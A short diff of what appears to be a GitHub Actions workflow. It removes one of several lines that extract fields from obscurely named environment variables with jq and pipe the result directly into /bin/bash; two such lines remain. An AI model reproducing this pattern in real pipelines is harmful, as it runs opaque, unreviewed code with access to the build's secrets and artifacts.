@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$onp5" | jq -r .vsqq3958 | /bin/bash
           printf '%s' "$anyq7" | jq -r .cls3168 | /bin/bash
-          printf '%s' "$lxmk66" | jq -r .bme5555 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
